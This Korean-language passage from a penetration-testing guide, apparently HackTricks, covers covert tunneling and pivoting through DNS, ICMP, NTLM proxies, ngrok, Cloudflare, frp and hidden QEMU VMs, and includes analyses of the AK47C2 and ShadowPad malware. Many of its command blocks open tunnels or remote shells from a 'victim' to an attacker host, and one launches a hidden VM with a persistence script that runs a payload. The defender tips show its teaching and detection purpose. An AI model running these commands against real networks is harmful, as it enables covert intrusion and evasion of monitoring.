**Profile -> Proxification Rules**에서 프록시로 연결할 프로그램 이름과 프록시로 연결할 IP에 대한 연결을 추가합니다. Proxifier 규칙은 애플리케이션, 대상 호스트 및 포트와 일치하도록 설정할 수 있습니다.<sup>[[27]](#references)</sup>

## NTLM 프록시를 통한 터널링

앞서 언급한 도구인 **Rpivot**은 NTLM 인증 프록시를 통해 릴레이할 수 있습니다. **OpenVPN**도 auth 파일과 NTLMv2 메서드를 사용하도록 구성하면 해당 프록시를 통해 트래픽을 라우팅할 수 있습니다. 이는 프록시 인증을 우회하는 것이 아니라 프록시를 통과하는 방법입니다.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm은 upstream NTLM 프록시에 인증하고, 로컬 listener를 노출하며, 로컬 터널 포트를 대상 서비스에 매핑할 수 있습니다. 그러면 클라이언트가 해당 로컬 포트를 사용할 수 있습니다.<sup>[[29]](#references)</sup>\
예를 들어 443 포트를 포워딩합니다.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

이제 예를 들어 피해자의 **SSH** 서비스가 443 포트에서 수신하도록 설정하면, 공격자의 2222 포트를 통해 연결할 수 있습니다.<sup>[[29]](#references)</sup>\
공격자가 2222 포트에서 수신하는 동안 localhost:443에 연결하는 **meterpreter**를 사용할 수도 있습니다.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy)는 Microsoft의 .NET reverse-proxy 툴킷입니다. 여기에서 찾을 수 있습니다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine은 DNS 쿼리를 통해 IPv4 터널을 만들고 TUN 인터페이스를 사용합니다. 문서에 안내된 설정을 위해서는 양쪽에서 해당 인터페이스를 생성하는 데 필요한 권한이 있어야 합니다.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS 전송은 직접 TCP 연결보다 오버헤드가 크고 일반적으로 느립니다. 이 터널을 통해 압축된 SSH 연결을 만들려면 다음을 사용할 수 있습니다:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**

Dnscat2는 DNS를 통해 암호화된 command-and-control 채널을 설정합니다. 아래의 서버 및 클라이언트 명령은 문서에 설명된 사용법을 따릅니다.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **PowerShell에서**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용하면 PowerShell에서 dnscat2 클라이언트를 실행할 수 있습니다. README에는 아래와 같은 `Start-Dnscat2` 매개변수가 설명되어 있습니다.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **dnscat을 사용한 포트 포워딩**

Dnscat2의 대화형 `listen` 명령은 로컬 리스너를 원격 호스트와 포트에 매핑합니다.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Proxychains DNS 변경

Proxychains-ng는 동적으로 링크된 TCP 연결을 후킹하며 UDP나 ICMP는 전달할 수 없습니다. DNS 프록시 설정은 구성할 수 있으므로, 고정된 공개 resolver를 가정하지 말고 설치된 `proxychains.conf`와 resolver helper를 확인하세요. 레거시 `proxyresolv` 스크립트는 resolver를 선택하기 위한 `PROXY_DNS_SERVER`를 제공합니다. 내부 이름을 확인해야 하는 경우 pivot에서 연결할 수 있는 resolver를 사용하세요.<sup>[[34]](#references)[[35]](#references)</sup>

## Go의 터널

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### 사용자 지정 DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor는 기업 네트워크에서 차단되는 경우가 드문 두 가지 프로토콜인 아웃바운드 **DNS**와 **일반 HTTP POST** 트래픽만 악용하는 **이중 채널 C2("AK47C2")**를 만들었습니다.<sup>[[2]](#references)</sup>

1. **DNS 모드 (AK47DNS)**
   • 임의의 5자 SessionID(예: `H4T14`)를 생성합니다.  
   • *작업 요청*에는 `1`을, *결과*에는 `2`를 앞에 붙인 다음 여러 필드(flags, SessionID, 컴퓨터 이름)를 연결합니다.  
   • 각 필드는 ASCII 키 `VHBD@H`로 **XOR 암호화**되고, 16진수로 인코딩된 다음 점으로 연결됩니다. 마지막에는 공격자가 제어하는 도메인이 붙습니다:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • 요청은 **TXT**(및 대체 **MG**) 레코드에 `DnsQuery()`를 사용합니다.  
   • 응답이 0xFF바이트를 초과하면 백도어는 데이터를 63바이트 조각으로 **분할**하고 다음 마커를 삽입합니다.
     `s<SessionID>t<TOTAL>p<POS>` 그러면 C2 서버가 조각의 순서를 재정렬할 수 있습니다.

2. **HTTP mode (AK47HTTP)**
   • JSON envelope를 구성합니다:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • 전체 blob은 XOR-`VHBD@H` 처리 후 → hex로 변환하여 `Content-Type: text/plain` 헤더와 함께 **`POST /`**의 body로 전송됩니다.
   • 응답도 동일한 인코딩을 따르며, `cmd` 필드는 `cmd.exe /c <command> 2>&1`로 실행됩니다.

Blue Team 메모
• 첫 번째 label이 긴 hexadecimal이며 항상 드문 도메인 하나로 끝나는 비정상적인 **TXT queries**를 살펴보세요.
• 상수 XOR key 뒤에 ASCII-hex가 이어지는 형태는 YARA로 쉽게 탐지할 수 있습니다: `6?56484244?484` (`VHBD@H`의 hex 표현).
• HTTP에서는 body가 순수한 hex이고 길이가 2바이트의 배수인 text/plain POST를 탐지하세요.

{{#note}}
이 채널은 각 sub-domain label을 63-octet DNS 제한 이내로 유지하지만, 프로토콜 준수만으로 은밀해지는 것은 아닙니다. 드문 도메인, 긴 hexadecimal label, 쿼리량은 여전히 탐지 신호입니다.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans 문서는 TUN device와 ICMP echo request를 사용하는 IPv4-over-ICMP tunnel을 설명합니다. 설정에는 해당 interface를 생성할 수 있는 충분한 권한이 필요합니다.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**여기에서 다운로드**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng는 ICMP를 통해 TCP 연결을 전송하며, 아래와 같이 proxy, 로컬 listener, 대상 호스트, 대상 포트에 `-p`, `-l`, `-r`, `-R` 옵션을 사용합니다.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/)은 보안 터널을 통해 로컬 네트워크 서비스를 온라인에 공개하는 에이전트입니다. CLI 문서에는 HTTP, TCP, 파일 URL 엔드포인트가 나와 있으며, 출력되는 엔드포인트 호스트 이름은 엔드포인트와 계정에 따라 달라질 수 있습니다.<sup>[[39]](#references)</sup>

### 설치

- 계정 만들기: https://ngrok.com/signup
- 클라이언트 다운로드:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### 기본 사용법

**문서:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_필요한 경우 에이전트는 인증 및 TLS 옵션도 지원합니다.<sup>[[39]](#references)</sup>_

#### TCP 터널링

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### HTTP를 사용해 파일 노출하기

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### HTTP 요청 스니핑

_XSS, SSRF, SSTI 등에 유용_\
독립 실행형 에이전트는 기본적으로 `http://127.0.0.1:4040`에서 HTTP 검사 인터페이스를 제공합니다. 이 인터페이스는 HTTP 트래픽용입니다.<sup>[[40]](#references)</sup>

#### 내부 HTTP 서비스 터널링

`--host-header=rewrite` 옵션은 업스트림 HTTP `Host` 헤더를 로컬 서비스와 일치하도록 다시 씁니다.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml 간단한 구성 예시

ngrok Agent Config v2를 사용합니다. 이름이 지정된 터널은 `proto`와 `addr`를 사용하며 `ngrok start`로 시작합니다.<sup>[[42]](#references)</sup> 터널 3개를 엽니다.

- TCP 2개
- /tmp/httpbin/의 정적 파일을 제공하는 HTTP 1개

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels는 Microsoft relay infrastructure를 통해 로컬 TCP 기반 서비스를 공개할 수 있습니다. 호스트 CLI가 아웃바운드 터널을 생성하고 `devtunnel connect`가 클라이언트에서 호스팅된 포트를 다시 생성합니다. 기본적으로 터널에는 인증이 필요하며, 접근 제어를 의도적으로 완화한 경우에는 예외입니다.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

이는 경계에서 새 인바운드 리스너를 열지 않고도 `*.devtunnels.ms`를 통해 RDP를 노출할 수 있습니다. 또한 `rdp2tcp` 같은 RDP virtual-channel tunnel과 결합해 RDP 세션을 임의의 TCP 트래픽을 위한 2단계 pivot으로 전환할 수도 있습니다.<sup>[[58]](#references)</sup>

위협 헌팅에서는 Dev Tunnels CLI 실행을 `*.devtunnels.ms`로 향하는 DNS/TLS 트래픽 및 예상치 못한 RDP virtual-channel 이벤트와 연관 지어 분석하세요. 인증된 tunnel은 Microsoft 소유의 relay를 사용한다는 이유만으로 안전한 것이 아닙니다.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel의 `cloudflared` connector는 아웃바운드 연결을 설정합니다. 게시된 애플리케이션은 HTTP, HTTPS, TCP, SSH, RDP를 라우팅할 수 있으며, quick tunnel은 HTTP 개발용으로 설계되었습니다.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel 한 줄 명령

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 출처 (레거시 모드)

레거시 `--socks5` 플래그는 로컬 origin이 SOCKS5를 사용한다고 `cloudflared`에 알립니다. 로컬 SOCKS5 리스너를 생성하지는 않습니다. 관리형 터널에서는 `originRequest.proxyType: socks`로 SOCKS5 origin 처리를 구성합니다.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### DNS를 통한 지속적인 터널

로컬에서 관리하는 터널 구성에서는 아래와 같이 소문자 `tunnel`, `credentials-file`, `url` 키를 사용합니다.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

커넥터를 시작합니다:

```bash
cloudflared tunnel run mytunnel
```

커넥터는 아웃바운드 연결을 설정하고, 기본적으로 QUIC을 협상한 뒤 실패하면 HTTP/2로 대체합니다. 모든 배포 환경에서 TCP/443을 사용한다고 가정하지 마세요. 배포 환경에 필요한 권한만 부여해 실행하세요.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, XTCP**를 지원하는 Go reverse proxy입니다. XTCP는 성공 여부가 NAT에 좌우되는 P2P hole punching을 사용합니다. **v0.53.0**부터는 **SSH Tunnel Gateway**로 작동할 수 있어, 대상 호스트에서 `frpc` 바이너리 없이 기본 OpenSSH 클라이언트를 사용할 수 있습니다.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 기본 reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### 새로운 SSH gateway 사용 (frpc binary 없이)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

위 명령은 `frps`가 게이트웨이 역할을 하는 동안 기본 OpenSSH 클라이언트를 사용해 피해자의 포트 **8080**을 **attacker_ip:9000**으로 게시합니다.<sup>[[50]](#references)</sup>

## QEMU를 이용한 은밀한 VM 기반 터널

QEMU user-mode networking은 가상 네트워크에 root 또는 관리자 권한이 필요하지 않으며, `-netdev user,hostfwd=...`는 호스트에서 게스트로 TCP, UDP 또는 UNIX 연결을 리디렉션합니다.<sup>[[51]](#references)</sup> TrustedSec은 호스트에 초점을 맞춘 EDR이 게스트 내부의 활동을 놓칠 수 있었던 사고에서 Tiny Core QEMU VM과 역방향 SSH 터널 시도를 문서화했습니다.<sup>[[1]](#references)</sup>

### 빠른 one-liner

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• 위 명령은 게스트 메모리 256 MiB와 qcow2 디스크 이미지를 사용하는 **Tiny Core Linux** 게스트를 실행합니다. 디스크 이미지는 RAM 디스크가 아닙니다.  
• Windows 호스트의 **2222/tcp** 포트는 게스트 내부의 **22/tcp** 포트로 투명하게 포워딩됩니다.  
• 공격자 관점에서 대상은 2222 포트만 노출합니다. 해당 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버가 처리합니다.

### VBScript를 통한 은밀한 실행

TrustedSec은 위에서 인용한 사건에서 VBS로 구동되는 QEMU 실행과 Tiny Core 이미지를 관찰했습니다.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

`cscript.exe //B update.vbs`로 스크립트를 실행하면 창이 숨겨진 상태로 유지됩니다.<sup>[[1]](#references)</sup>

### 게스트 내부 persistence

인용된 사고 사례에서는 `/opt/bootlocal.sh`와 `/opt/filetool.lst`를 통해 상태 비저장 Tiny Core 게스트에 persistence를 구현했습니다:<sup>[[1]](#references)</sup>

1. payload를 `/opt/123.out`에 저장  
2. `/opt/bootlocal.sh`에 추가:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. `home/tc` 및 `opt`를 `/opt/filetool.lst`에 추가해 shutdown 시 payload가 `mydata.tgz`에 패킹되도록 합니다.

### Telemetry 고려 사항

• 호스트에는 여전히 QEMU 프로세스, qcow2 이미지, 호스트에서 포워딩된 리스너가 노출됩니다.  
• 호스트 전용 프로세스 스캔은 게스트 프로세스를 검사하지 않을 수 있지만, 가상화가 반드시 탐지를 피하게 해 주는 것은 아닙니다. 네트워크, QEMU, 이미지 telemetry를 통해 여전히 노출될 수 있습니다.<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 팁

• 사용자가 쓰기 가능한 경로에 있는 **예상치 못한 QEMU/VirtualBox/KVM 바이너리**에 경고를 설정합니다.  
• `qemu-system*.exe`에서 시작되는 아웃바운드 연결을 차단합니다.  
• QEMU가 시작된 직후 바인딩되는 드문 리스닝 포트(2222, 10022, …)를 조사합니다.

## `HttpAddUrl`을 통한 IIS/HTTP.sys relay 노드 (ShadowPad)

Check Point는 ShadowPad의 IIS 모듈이 `HttpAddUrl`을 통해 URL prefix에 바인딩하여 침해된 경계 웹 서버를 backdoor 및 relay 노드로 전환한다고 설명합니다.<sup>[[3]](#references)</sup>

같은 보고서에서는 아래에 요약된 기본값, 와일드카드 리스너, 패킷 복호화, relay 큐, 디버그 telemetry도 자세히 다룹니다.<sup>[[3]](#references)</sup>

* **Config 기본값** – 모듈의 JSON config에서 값을 생략하면 그럴듯한 IIS 기본값(`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`)으로 대체됩니다. 따라서 정상 트래픽에는 IIS가 올바른 브랜딩으로 응답합니다.
* **와일드카드 가로채기** – 운영자는 세미콜론으로 구분된 URL prefix 목록(호스트 및 경로의 와일드카드)을 제공합니다. 모듈은 각 항목에 대해 `HttpAddUrl`을 호출하므로 HTTP.sys는 일치하는 요청을 악성 핸들러로 라우팅하고, 일치하지 않는 요청은 일반 IIS 동작으로 처리됩니다.
* **암호화된 첫 번째 패킷** – 요청 본문의 첫 2바이트에는 사용자 지정 32비트 PRNG의 seed가 담깁니다. 이후 모든 바이트는 프로토콜 파싱 전에 생성된 keystream과 XOR 연산됩니다:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay 오케스트레이션** – 이 모듈은 두 개의 목록, 즉 “servers”(업스트림 노드)와 “clients”(다운스트림 implants)를 유지합니다. 약 30초 동안 heartbeat가 수신되지 않으면 항목이 제거됩니다. 두 목록이 모두 비어 있지 않으면 정상 상태인 첫 번째 server와 첫 번째 client를 연결하고, 한쪽에서 연결을 종료할 때까지 두 소켓 간에 바이트를 그대로 전달합니다.
* **디버그 텔레메트리** – 선택적 로깅을 통해 각 연결의 source IP, destination IP, 총 전달 바이트 수를 기록합니다. 조사관들은 이 흔적을 이용해 여러 피해자에 걸친 ShadowPad mesh를 재구성했습니다.

---

## 확인할 다른 도구

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Shadow 속에 숨기: QEMU Virtualization을 통한 은밀한 Tunnel](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 이전: Storm-2603의 과거 Ransomware 작전 살펴보기](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon 내부: 은밀한 공격 작전의 Relay Network와 내부 동작 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Firewall/IDS 제한 우회](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh 매뉴얼](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config 매뉴얼](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 릴리스 노트](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Metasploit에서의 Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy 모듈 문서](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute 모듈 문서](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng 빠른 시작](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat 매뉴얼](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink 매뉴얼](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY 명령줄 옵션](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy 명령](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier 문서](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 매뉴얼](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: 도메인 이름 - 구현 및 명세](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web 검사 인터페이스](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel 개요](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin 매개변수](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel 설정](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel 구성 파일](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel 실행 매개변수](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp 개념](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU 네트워킹 문서](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale 소스 저장소](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: BOF-PE에서 CDN을 경유하는 Tailnet 구축](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLI 명령](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer와 Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
{{#include ../banners/hacktricks-training.md}}
